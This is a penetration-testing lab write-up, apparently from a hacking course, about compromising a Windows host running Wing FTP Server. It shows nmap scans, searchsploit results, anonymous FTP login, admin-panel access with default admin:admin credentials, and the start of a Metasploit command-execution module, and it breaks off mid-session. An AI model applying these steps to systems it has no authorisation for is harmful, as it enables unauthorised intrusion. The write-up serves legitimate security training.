So we see FTP and 80 (http) open  
Additionally, we can see it's using "Wing FTP Server"  
Lets search and see if there is anything in searchsploit.  
Additionally since it's open on port 80, lets see if there is anything on the page?  
![Image1](/VHL/Reports/002/2_1.png)

Let's also see if we can determine what OS is being used:
```bash
sudo nmap -A -p 21,80 -Pn $STEVEN 
OS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows 8.1 R1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
```
So at this point we are guessing this is a windows server.  
Let's see what searchsploit and exploit-db have?  

```searchsploit wing
Wing FTP Server - (Authenticated) Command Execution (Metasploit)                                              | windows/remote/34517.rb

Wing FTP Server 3.2.4 - Cross-Site Request Forgery                                                            | multiple/webapps/10821.txt
Wing FTP Server 6.0.7 - Unquoted Service Path                                                                 | windows/local/47818.txt
Wing FTP Server 6.2.3 - Privilege Escalation                                                                  | windows/local/48160.py
Wing FTP Server 6.2.5 - Privilege Escalation                                                                  | multiple/webapps/48154.sh
Wing FTP Server 6.3.8 - Remote Code Execution (Authenticated)                                                 | lua/webapps/48676.txt
Wing FTP Server Admin 4.4.5 - Cross-Site Request Forgery (Add User)                                           | php/webapps/36992.txt
Wing FTP Server Admin 4.4.5 - Multiple Vulnerabilities                                                        | windows/webapps/36861.txt
```

Since we know anonymous ftp is allowed, maybe we can try that?  
![Image2](/VHL/Reports/002/2_2.png)

So we know that we can get into the server using anonymous login (with no password). 
Can we do anything with this?   
I can't tell what version it is using despite being in the page.   
As an anonymous user, I don't have permissions to upload.  
Let's see if the exploits yield any success?  

Metasploit shows 1 good option:  
```bash
search wing
   11  exploit/windows/ftp/wing_ftp_admin_exec         2014-06-19       excellent  Yes    Wing FTP Server Authenticated Command Execution
```

This required admin credentials - I realized I didn't have admin credentials, and would not be able to utilize this exploit currently.  
Reviewing the internet for "Wing FTP server" however, tells me port 5466 and 7466 are also commonly used ports.  
Lets scan to see if these yield anything?  

```bash
sudo nmap -sS -Pn -p 5466,7466 $STEVEN
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:43 EDT
Nmap scan report for 10.14.1.36

PORT     STATE    SERVICE
5466/tcp open     unknown
7466/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds
```

Indeed!  Let's see what is there.

```bash
sudo nmap -sV -Pn -p 5466,7466 $STEVEN
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-27 18:44 EDT

7466/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF:nericLines,1E7,"HTTP/1\.0\x20200\x20HTTP\x20OK\r\nServer:\x20Wing\x20FT
```

It looks like we are getting a page response from one of these, so can we pull a page?  
10.14.1.36:7466 yields nothing , but 10.14.1.36:5466 gives us the admin page!  
Lets try admin:admin?   
Wow, I didn't expect that to workâ€¦  
![Image3](/VHL/Reports/002/2_3.png)

So right now, we have both a metasploit that can take an admin user/password, as well as FTP webpage administrator access.  
Lets try metasploit first to see where this gets us?  
```bash
msfconsole
use windows/ftp/wing_ftp_admin_exec

### Searching for the key

From here, attempted to search for key.txt:  
```bash
search -f *key.txt
No files matching your search were found.
```

Ok, nothing returned, lets check the paths from the provided / listed for the course?
```bash
ls "C:\Documents and Settings\Administrator\Desktop"
